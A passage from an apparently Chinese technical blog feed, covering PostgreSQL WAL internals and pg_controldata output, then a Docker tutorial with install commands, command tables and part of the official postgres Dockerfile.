class="line">&#123;</span><br><span class="line">XLogRecPtrrecptr;</span><br><span class="line">TimeLineIDtli;</span><br><span class="line"></span><br><span class="line">SpinLockAcquire(&amp;XLogCtl-&gt;info_lck);</span><br><span class="line">recptr = XLogCtl-&gt;lastReplayedEndRecPtr;</span><br><span class="line">tli = XLogCtl-&gt;lastReplayedTLI;</span><br><span class="line">SpinLockRelease(&amp;XLogCtl-&gt;info_lck);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (replayTLI)</span><br><span class="line">*replayTLI = tli;</span><br><span class="line"><span class="keyword">return</span> recptr;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * GetInsertRecPtr -- Returns the current insert position.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">NOTE:</span> The value *actually* returned is the position of the last full</span></span><br><span class="line"><span class="comment"> * xlog page. It lags behind the real insert position by at most 1 page.</span></span><br><span class="line"><span class="comment"> * For that, we don't need to scan through WAL insertion locks, and an</span></span><br><span class="line"><span class="comment"> * approximation is enough for the current usage of this function.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">XLogRecPtr</span><br><span class="line">GetInsertRecPtr(<span class="keyword">void</span>)</span><br><span class="line">&#123;</span><br><span class="line">XLogRecPtrrecptr;</span><br><span class="line"></span><br><span class="line">SpinLockAcquire(&amp;XLogCtl-&gt;info_lck);</span><br><span class="line">recptr = XLogCtl-&gt;LogwrtRqst.Write;</span><br><span class="line">SpinLockRelease(&amp;XLogCtl-&gt;info_lck);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> recptr;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>未完成….</strong></p><h4 id="补充"><a href="#补充" class="headerlink" title="补充"></a>补充</h4><p>lsn是全局唯一值, 用于wal记录中记录总偏移位置.  [pg_waldump]</p><p>pg_controldata –&gt;  使用 $(PGDATA)/global/pg_control</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line">pg_control version number:            <span class="number">1002</span></span><br><span class="line">Catalog version number:               <span class="number">201707211</span></span><br><span class="line">Database system identifier:           <span class="number">6721851427625463280</span></span><br><span class="line">Database cluster state:               in production</span><br><span class="line">pg_control last modified:             Tue <span class="number">06</span> Aug <span class="number">2019</span> <span class="number">08</span>:<span class="number">56</span>:<span class="number">48</span> AM CST</span><br><span class="line">Latest checkpoint location:           <span class="number">0</span>/<span class="number">170F</span>548</span><br><span class="line">Prior checkpoint location:            <span class="number">0</span>/<span class="number">170F</span>270</span><br><span class="line">Latest checkpoint's REDO location:    <span class="number">0</span>/<span class="number">170F</span>548</span><br><span class="line">Latest checkpoint's REDO WAL file:    <span class="number">000000010000000000000001</span></span><br><span class="line">Latest checkpoint's TimeLineID:       <span class="number">1</span></span><br><span class="line">Latest checkpoint's PrevTimeLineID:   <span class="number">1</span></span><br><span class="line">Latest checkpoint's full_page_writes: on</span><br><span class="line">Latest checkpoint's NextXID:          <span class="number">0</span>:<span class="number">558</span></span><br><span class="line">Latest checkpoint's NextOID:          <span class="number">13901</span></span><br><span class="line">Latest checkpoint's NextMultiXactId:  <span class="number">1</span></span><br><span class="line">Latest checkpoint's NextMultiOffset:  <span class="number">0</span></span><br><span class="line">Latest checkpoint's oldestXID:        <span class="number">551</span></span><br><span class="line">Latest checkpoint's oldestXID's DB:   <span class="number">1</span></span><br><span class="line">Latest checkpoint's oldestActiveXID:  <span class="number">0</span></span><br><span class="line">Latest checkpoint's oldestMultiXid:   <span class="number">1</span></span><br><span class="line">Latest checkpoint's oldestMulti's DB: <span class="number">1</span></span><br><span class="line">Latest checkpoint's oldestCommitTsXid:<span class="number">0</span></span><br><span class="line">Latest checkpoint's newestCommitTsXid:<span class="number">0</span></span><br><span class="line">Time of latest checkpoint:            Tue <span class="number">06</span> Aug <span class="number">2019</span> <span class="number">08</span>:<span class="number">56</span>:<span class="number">43</span> AM CST</span><br><span class="line">Fake LSN counter <span class="keyword">for</span> unlogged rels:   <span class="number">0</span>/<span class="number">1</span></span><br><span class="line">Minimum recovery ending location:     <span class="number">0</span>/<span class="number">0</span></span><br><span class="line">Min recovery ending loc's timeline:   <span class="number">0</span></span><br><span class="line">Backup start location:                <span class="number">0</span>/<span class="number">0</span></span><br><span class="line">Backup end location:                  <span class="number">0</span>/<span class="number">0</span></span><br><span class="line">End-of-backup record required:        no</span><br><span class="line">wal_level setting:                    replica</span><br><span class="line">wal_log_hints setting:                off</span><br><span class="line">max_connections setting:              <span class="number">100</span></span><br><span class="line">max_worker_processes setting:         <span class="number">10</span></span><br><span class="line">max_prepared_xacts setting:           <span class="number">0</span></span><br><span class="line">max_locks_per_xact setting:           <span class="number">64</span></span><br><span class="line">track_commit_timestamp setting:       off</span><br><span class="line">Maximum data alignment:               <span class="number">8</span></span><br><span class="line">Database block size:                  <span class="number">8192</span></span><br><span class="line">Blocks per segment of large relation: <span class="number">131072</span></span><br><span class="line">WAL block size:                       <span class="number">8192</span></span><br><span class="line">Bytes per WAL segment:                <span class="number">16777216</span></span><br><span class="line">Maximum length of identifiers:        <span class="number">64</span></span><br><span class="line">Maximum columns in an index:          <span class="number">32</span></span><br><span class="line">Maximum size of a TOAST chunk:        <span class="number">1996</span></span><br><span class="line">Size of a large-object chunk:         <span class="number">2048</span></span><br><span class="line">Date/time type storage:               <span class="number">64</span>-bit integers</span><br><span class="line">Float4 argument passing:              by value</span><br><span class="line">Float8 argument passing:              by value</span><br><span class="line">Data page checksum version:           <span class="number">0</span></span><br><span class="line">Mock authentication nonce:            <span class="number">9</span>d1637d4a6729f17d02cc91eac480e274342cd29ca69add6ca7b960e94c9c7b2</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Database </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Database </tag>
            
            <tag> Postgresql </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Docker</title>
      <link href="/2019/04/18/docker/Docker/"/>
      <url>/2019/04/18/docker/Docker/</url>
      
        <content type="html"><![CDATA[<h3 id="Docker-官网注册"><a href="#Docker-官网注册" class="headerlink" title="Docker:   官网注册"></a>Docker:   <a href="https://hub.docker.com/" target="_blank" rel="noopener">官网注册</a></h3><h4 id="Centos-安装"><a href="#Centos-安装" class="headerlink" title="Centos 安装"></a>Centos 安装</h4><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ curl -fsSL get.docker.com -o get-docker.sh</span><br><span class="line">$ sudo sh get-docker.sh --mirror Aliyun</span><br></pre></td></tr></table></figure><p><strong>启动Docker CE</strong></p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ sudo systemctl enable docker</span><br><span class="line">$ sudo systemctl start docker</span><br></pre></td></tr></table></figure><p><strong>建立Docker用户组</strong></p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ sudo groupadd docker</span><br><span class="line">$ sudo usermod -aG docker <span class="variable">$USER</span></span><br></pre></td></tr></table></figure><a id="more"></a><p><br></p><h4 id="Docker-基础使用"><a href="#Docker-基础使用" class="headerlink" title="Docker 基础使用"></a>Docker 基础使用</h4><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ sudo docker login</span><br></pre></td></tr></table></figure><p>images 查看实例</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ sudo docker images</span><br><span class="line">REPOSITORY              TAG                 IMAGE ID            CREATED             SIZE</span><br><span class="line">centos                  latest              <span class="number">9</span>f38484d220f        <span class="number">4</span> weeks ago         <span class="number">202</span>MB</span><br><span class="line">vagabond1132/centos_7   latest              <span class="number">9</span>f38484d220f        <span class="number">4</span> weeks ago         <span class="number">202</span>MB</span><br></pre></td></tr></table></figure><p>ps 查看链接实例:</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ sudo docker ps</span><br><span class="line">CONTAINER ID        IMAGE                   COMMAND             CREATED             STATUS              PORTS               NAMES</span><br><span class="line">d5e50f6fa6a6        vagabond1132/centos_7   <span class="string">"/bin/bash"</span>         <span class="number">2</span> hours ago         Up <span class="number">2</span> hours                              clever_hypatia</span><br><span class="line"><span class="number">1680</span>f31b1e29        centos                  <span class="string">"/bin/bash"</span>         <span class="number">3</span> hours ago         Up <span class="number">3</span> hours                              peaceful_khorana</span><br><span class="line">d9be61c00477        centos                  <span class="string">"/bin/bash"</span>         <span class="number">3</span> hours ago         Up <span class="number">3</span> hours                              quizzical_elgamal</span><br></pre></td></tr></table></figure><p>run: 创建启动实例:</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo docker run -ti vagabond1132/centos_7  /bin/bash</span><br></pre></td></tr></table></figure><p>创建实例后，才能使用exec, start, stop</p><p>tag 标签</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo docker tag centos:latest vagabond1132/centos_base_7:latest</span><br></pre></td></tr></table></figure><p>sudo docker images</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">REPOSITORY                   TAG                 IMAGE ID            CREATED             SIZE</span><br><span class="line">vagabond1132/centos_base_7   latest              <span class="number">9</span>f38484d220f        <span class="number">4</span> weeks ago         <span class="number">202</span>MB</span><br><span class="line">centos                       latest              <span class="number">9</span>f38484d220f        <span class="number">4</span> weeks ago         <span class="number">202</span>MB</span><br><span class="line">vagabond1132/centos_7        latest              <span class="number">9</span>f38484d220f        <span class="number">4</span> weeks ago         <span class="number">202</span>MB</span><br></pre></td></tr></table></figure><p>push 上传</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo docker push centos  vagabond1132/centos_base:latest</span><br></pre></td></tr></table></figure><h3 id="Run-常用选项"><a href="#Run-常用选项" class="headerlink" title="Run 常用选项"></a>Run 常用选项</h3><table><thead><tr><th>选项</th><th>说明</th></tr></thead><tbody><tr><td>-d</td><td>后台运行容器, 并返回容器ID；不指定时, 启动后开始打印日志, <code>Ctrl + C</code> 退出命令同时会关闭容器</td></tr><tr><td>-i</td><td>以交互模式运行容器, 通常与 -t 同时使用；</td></tr><tr><td>-t</td><td>为容器重新分配一个伪输入终端, 通常与 -i 同时使用</td></tr><tr><td>–name “anyesu-container”</td><td>为容器指定一个别名, 不指定时随机生成</td></tr><tr><td>-h docker-anyesu</td><td>设置容器的主机名, 默认随机生成</td></tr><tr><td>–dns 8.8.8.8</td><td>指定容器使用的DNS服务器, 默认和宿主一致</td></tr><tr><td>-e docker_host=172.17.0.1</td><td>设置环境变量</td></tr><tr><td>–cpuset=”0-2” or –cpuset=”0,1,2”</td><td>绑定容器到指定CPU运行</td></tr><tr><td>-m 100M</td><td>设置容器使用内存最大值</td></tr><tr><td>–net bridge</td><td>指定容器的网络连接类型, 支持 <code>bridge</code> / <code>host</code> / <code>none</code> / <code>container</code> 四种类型</td></tr><tr><td>–ip 172.18.0.13</td><td>为容器分配固定ip(需要使用自定义网络)</td></tr><tr><td>–expose 8081 –expose 8082</td><td>开放一个端口或一组端口, 会覆盖镜像设置中开放的端口</td></tr><tr><td>-p [宿主机端口]:[容器内端口]</td><td>宿主机到容器的端口映射, 可指定宿主机的要监听的ip, 默认为 <code>0.0.0.0</code></td></tr><tr><td>-P</td><td>注意是大写的, 宿主机随机指定一组可用的端口映射容器 <code>expose</code> 的所有端口</td></tr><tr><td>-v [宿主机目录路径]:[容器内目录路径]</td><td>挂载宿主机的指定目录(或文件)到容器内的指定目录(或文件)</td></tr><tr><td>–add-host [主机名]:[ip]</td><td>为容器hosts文件追加host, 默认会在hosts文件最后追加 <code>[主机名]:[容器ip]</code></td></tr><tr><td>–volumes-from [其他容器名]</td><td>将其他容器的数据卷添加到此容器</td></tr><tr><td>–link [其他容器名]:[在该容器中的别名]</td><td>添加链接到另一个容器, 在本容器hosts文件中加入关联容器的记录, 效果类似于 <code>--add-host</code></td></tr></tbody></table><h3 id="基础命令"><a href="#基础命令" class="headerlink" title="基础命令"></a>基础命令</h3><table><thead><tr><th>选项</th><th>说明</th></tr></thead><tbody><tr><td>attach</td><td>进入运行中的容器, 显示该容器的控制台界面。注意, 从该指令退出会导致容器关闭</td></tr><tr><td>build</td><td>根据 Dockerfile 文件构建镜像</td></tr><tr><td>commit</td><td>提交容器所做的改为为一个新的镜像</td></tr><tr><td>cp</td><td>在容器和宿主机之间复制文件</td></tr><tr><td>create</td><td>根据镜像生成一个新的容器</td></tr><tr><td>diff</td><td>展示容器相对于构建它的镜像内容所做的改变</td></tr><tr><td>events</td><td>实时打印服务端执行的事件</td></tr><tr><td>exec</td><td>在已运行的容器中执行命令</td></tr><tr><td>export</td><td>导出容器到本地快照文件</td></tr><tr><td>history</td><td>显示镜像每层的变更内容</td></tr><tr><td>images</td><td>列出本地所有镜像</td></tr><tr><td>import</td><td>导入本地容器快照文件为镜像</td></tr><tr><td>info</td><td>显示 Docker 详细的系统信息</td></tr><tr><td>inspect</td><td>查看容器或镜像的配置信息, 默认为json数据</td></tr><tr><td>kill</td><td><code>-s</code> 选项向容器发送信号, 默认为SIGKILL信号(强制关闭)</td></tr><tr><td>load</td><td>导入镜像压缩包</td></tr><tr><td>login</td><td>登录第三方仓库</td></tr><tr><td>logout</td><td>退出第三方仓库</td></tr><tr><td>logs</td><td>打印容器的控制台输出内容</td></tr><tr><td>pause</td><td>暂停容器</td></tr><tr><td>port</td><td>容器端口映射列表</td></tr><tr><td>ps</td><td>列出正在运行的容器, <code>-a</code> 选项显示所有容器</td></tr><tr><td>pull</td><td>从镜像仓库拉取镜像</td></tr><tr><td>push</td><td>将镜像推送到镜像仓库</td></tr><tr><td>rename</td><td>重命名容器名</td></tr><tr><td>restart</td><td>重启容器</td></tr><tr><td>rm</td><td>删除已停止的容器, <code>-f</code> 选项可强制删除正在运行的容器</td></tr><tr><td>rmi</td><td>删除镜像(必须先删除该镜像构建的所有容器)</td></tr><tr><td>run</td><td>根据镜像生成并进入一个新的容器</td></tr><tr><td>save</td><td>打包本地镜像, 使用压缩包来完成迁移</td></tr><tr><td>search</td><td>查找镜像</td></tr><tr><td>start</td><td>启动关闭的容器</td></tr><tr><td>stats</td><td>显示容器对资源的使用情况(内存、CPU、磁盘等)</td></tr><tr><td>stop</td><td>关闭正在运行的容器</td></tr><tr><td>tag</td><td>修改镜像tag</td></tr><tr><td>top</td><td>显示容器中正在运行的进程(相当于容器内执行 <code>ps -ef</code> 命令)</td></tr><tr><td>unpause</td><td>恢复暂停的容器</td></tr><tr><td>update</td><td>更新容器的硬件资源限制(内存、CPU等)</td></tr><tr><td>version</td><td>显示docker客户端和服务端版本信息</td></tr><tr><td>wait</td><td>阻塞当前命令直到对应的容器被关闭, 容器关闭后打印结束代码</td></tr><tr><td>daemon</td><td>这个子命令已过期, 将在Docker 17.12之后的版本中移出, 直接使用dockerd</td></tr></tbody></table><h3 id="管理命令"><a href="#管理命令" class="headerlink" title="管理命令"></a>管理命令</h3><table><thead><tr><th>选项</th><th>说明</th></tr></thead><tbody><tr><td>container</td><td>管理容器</td></tr><tr><td>image</td><td>管理镜像</td></tr><tr><td>network</td><td>管理容器网络(默认为bridge、host、none三个网络配置)</td></tr><tr><td>plugin</td><td>管理插件</td></tr><tr><td>system</td><td>管理系统资源。其中, <code>docker system prune</code> 命令用于清理没有使用的镜像, 容器, 数据卷以及网络</td></tr><tr><td>volume</td><td>管理数据卷</td></tr><tr><td>swarm</td><td>管理Swarm模式</td></tr><tr><td>service</td><td>管理Swarm模式下的服务</td></tr><tr><td>node</td><td>管理Swarm模式下的docker集群中的节点</td></tr><tr><td>secret</td><td>管理Swarm模式下的敏感数据</td></tr><tr><td>stack</td><td>Swarm模式下利用compose-file管理服务</td></tr></tbody></table><h3 id="Dockerfiles-编写"><a href="#Dockerfiles-编写" class="headerlink" title="Dockerfiles 编写"></a><a href="https://github.com/CentOS/CentOS-Dockerfiles" target="_blank" rel="noopener">Dockerfiles</a> 编写</h3><p>Dockerfile 是文本文件, 其中包含了一条条指令, 每一条指令构建一层，因此每一条指令的内容，就是描述该层应当如何构建。</p><p>所谓定制镜像: 一定是以某一个镜像为基础, 在其上进行定制.  例如在某一个容器上进行修改. 那么原始镜像必须要手动指定，  FROM 是<strong>基础原始镜像</strong>  因此一个Dockerfile 中 From是必备的指令，并且必须是第一条指令。</p><p><a href="https://github.com/docker-library/postgres/blob/7e80419825e4bab4e749bc61334570ffc261ea5e/11/Dockerfile" target="_blank" rel="noopener"><a href="https://github.com/docker-library/postgres/blob/7e80419825e4bab4e749bc61334570ffc261ea5e/11/Dockerfile" target="_blank" rel="noopener">https://github.com/docker-library/postgres/blob/7e80419825e4bab4e749bc61334570ffc261ea5e/11/Dockerfile</a></a></p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># vim:set ft=dockerfile:</span></span><br><span class="line">FROM debian:stretch-slim</span><br><span class="line"></span><br><span class="line">RUN set -ex; \</span><br><span class="line"><span class="keyword">if</span> ! command -v gpg &gt; /dev/null; then \</span><br><span class="line">apt-get update; \</span><br><span class="line">apt-get install -y --no-install-recommends \</span><br><span class="line">gnupg \</span><br><span class="line">dirmngr \</span><br><span class="line">; \</span><br><span class="line">rm -rf /var/lib/apt/lists/*; \</span><br><span class="line">fi</span><br><span class="line"></span><br><span class="line"><span class="comment"># explicitly set user/group IDs</span></span><br><span class="line">RUN set -eux; \</span><br><span class="line">groupadd -r postgres --gid=<span class="number">999</span>; \</span><br><span class="line"><span class="comment"># https://salsa.debian.org/postgresql/postgresql-common/blob/997d842ee744687d99a2b2d95c1083a2615c79e8/debian/postgresql-common.postinst#L32-35</span></span><br><span class="line">useradd -r -g postgres --uid=<span class="number">999</span> --home-dir=/var/lib/postgresql --shell=/bin/bash postgres; \</span><br><span class="line"><span class="comment"># also create the postgres user's home directory with appropriate permissions</span></span><br><span class="line"><span class="comment"># see https://github.com/docker-library/postgres/issues/274</span></span><br><span class="line">mkdir -p /var/lib/postgresql; \</span><br><span class="line">chown -R postgres:postgres /var/lib/postgresql</span><br><span class="line"></span><br><span class="line"><span class="comment"># grab gosu for easy step-down from root</span></span><br><span class="line">ENV GOSU_VERSION <span class="number">1.11</span></span><br><span class="line">RUN set -x \</span><br><span class="line">&amp;&amp; apt-get update &amp;&amp; apt-get install -y --no-install-recommends ca-certificates wget &amp;&amp; rm -rf /var/lib/apt/lists/* \</span><br><span class="line">&amp;&amp; wget -O /usr/local/bin/gosu <span class="string">"https://github.com/tianon/gosu/releases/download/<span class="variable">$GOSU_VERSION</span>/gosu-$(dpkg --print-architecture)"</span> \</span><br><span class="line">&amp;&amp; wget -O /usr/local/bin/gosu.asc <span class="string">"https://github.com/tianon/gosu/releases/download/<span class="variable">$GOSU_VERSION</span>/gosu-$(dpkg --print-architecture).asc"</span> \</span><br><span class="line">&amp;&amp; export GNUPGHOME=<span class="string">"$(mktemp -d)"</span> \</span><br><span class="line">&amp;&amp; gpg --batch --keyserver ha.pool.sks-keyservers.net --recv-keys B42F6819007F00F88E364FD4036A9C25BF357DD4 \</span><br><span class="line">&amp;&amp; gpg --batch --verify /usr/local/bin/gosu.asc /usr/local/bin/gosu \</span><br><span class="line">&amp;&amp; &#123; command -v gpgconf &gt; /dev/null &amp;&amp; gpgconf --kill all || :; &#125; \</span><br><span class="line">&amp;&amp; rm -rf <span class="string">"<span class="variable">$GNUPGHOME</span>"</span> /usr/local/bin/gosu.asc \</span><br><span class="line">&amp;&amp; chmod +x /usr/local/bin/gosu \</span><br><span class="line">&amp;&amp; gosu nobody true \</span><br><span class="line">&amp;&amp; apt-get purge -y --auto-remove ca-certificates wget</span><br><span class="line"></span><br><span class="line"><span class="comment"># make the "en_US.UTF-8" locale so postgres will be utf-8 enabled by default</span></span><br><span class="line">RUN set -eux; \</span><br><span class="line"><span class="keyword">if</span> [ -f /etc/dpkg/dpkg.cfg.d/docker ]; then \</span><br><span class="line">grep -q <span class="string">'/usr/share/locale'</span> /etc/dpkg/dpkg.cfg.d/docker; \</span><br><span class="line">sed -ri <span class="string">'/\/usr\/share\/locale/d'</span> /etc/dpkg/dpkg.cfg.d/docker; \</span><br><span class="line">! grep -q <span class="string">'/usr/share/locale'</span> /etc/dpkg/dpkg.cfg.d/docker; \</span><br><span class="line">fi; \</span><br><span class="line">apt-get update; apt-get install -y locales; rm -rf /var/lib/apt/lists/*; \</span><br><span class="line">localedef -i en_US -c -f UTF-<span class="number">8</span> -A /usr/share/locale/locale.alias en_US.UTF-<span class="number">8</span></span><br><span class="line">ENV LANG en_US.utf8</span><br><span class="line"></span><br><span class="line"><span class="comment"># install "nss_wrapper" in case we need to fake "/etc/passwd" and "/etc/group" (especially for OpenShift)</span></span><br><span class="line"><span class="comment"># https://github.com/docker-library/postgres/issues/359</span></span><br><span class="line"><span class="comment"># https://cwrap.org/nss_wrapper.html</span></span><br><span class="line">RUN set -eux; \</span><br><span class="line">apt-get update; \</span><br><span class="line">apt-get install -y --no-install-recommends libnss-wrapper; \</span><br><span class="line">rm -rf /var/lib/apt/lists/*</span><br><span class="line"></span><br><span class="line">RUN mkdir /docker-entrypoint-initdb.d</span><br><span class="line"></span><br><span class="line">RUN set -ex; \</span><br><span class="line"><span class="comment"># pub   4096R/ACCC4CF8 2011-10-13 [expires: 2019-07-02]</span></span><br><span class="line"><span class="comment">#       Key fingerprint = B97B 0AFC AA1A 47F0 44F2  44A0 7FCC 7D46 ACCC 4CF8</span></span><br><span class="line"><span class="comment"># uid                  PostgreSQL Debian Repository</span></span><br><span class="line">key=<span class="string">'B97B0AFCAA1A47F044F244A07FCC7D46ACCC4CF8'</span>; \</span><br><span class="line">export GNUPGHOME=<span class="string">"$(mktemp -d)"</span>; \</span><br><span class="line">gpg --batch --keyserver ha.pool.sks-keyservers.net --recv-keys <span class="string">"<span class="variable">$key</span>"</span>; \</span><br><span class="line">gpg --batch --export <span class="string">"<span class="variable">$key</span>"</span> &gt; /etc/apt/trusted.gpg.d/postgres.gpg; \</span><br><span class="line">command -v gpgconf &gt; /dev/null &amp;&amp; gpgconf --kill all; \</span><br><span class="line">rm -rf <span class="string">"<span class="variable">$GNUPGHOME</span>"</span>; \</span><br><span class="line">apt-key list</span><br><span class="line"></span><br><span class="line">ENV PG_MAJOR <span class="number">11</span></span><br><span class="line">ENV PG_VERSION <span class="number">11.2</span>-<span class="number">1</span>.pgdg90+<span class="number">1</span></span><br><span class="line"></span><br><span class="line">RUN set -ex; \</span><br><span class="line">\</span><br><span class="line"><span class="comment"># see note below about "*.pyc" files</span></span><br><span class="line">export PYTHONDONTWRITEBYTECODE=<span class="number">1</span>; \</span><br><span class="line">\</span><br><span class="line">dpkgArch=<span class="string">"$(dpkg --print-architecture)"</span>; \</span><br><span class="line">case <span class="string">"<span class="variable">$dpkgArch</span>"</span> <span class="keyword">in</span> \</span><br><span class="line">amd64|i386|ppc64el) \</span><br><span class="line"><span class="comment"># arches officialy built by upstream</span></span><br><span class="line">echo <span class="string">"deb http://apt.postgresql.org/pub/repos/apt/ stretch-pgdg main <span class="variable">$PG_MAJOR</span>"</span> &gt; /etc/apt/sources.list.d/pgdg.list; \</span><br><span class="line">apt-get update; \</span><br><span class="line">;; \</span><br><span class="line">*) \</span><br><span class="line"><span class="comment"># we're on an architecture upstream doesn't officially build for</span></span><br><span class="line"><span class="comment"># let's build binaries from their published source packages</span></span><br><span class="line">echo <span class="string">"deb-src http://apt.postgresql.org/pub/repos/apt/ stretch-pgdg main <span class="variable">$PG_MAJOR</span>"</span> &gt; /etc/apt/sources.list.d/pgdg.list; \</span><br><span class="line">\</span><br><span class="line">case <span class="string">"<span class="variable">$PG_MAJOR</span>"</span> <span class="keyword">in</span> \</span><br><span class="line"><span class="number">9</span>.* | <span class="number">10</span> ) ;; \</span><br><span class="line">*) \</span><br><span class="line"><span class="comment"># https://github.com/docker-library/postgres/issues/484 (clang-6.0 required, only available in stretch-backports)</span></span><br><span class="line"><span class="comment"># TODO remove this once we hit 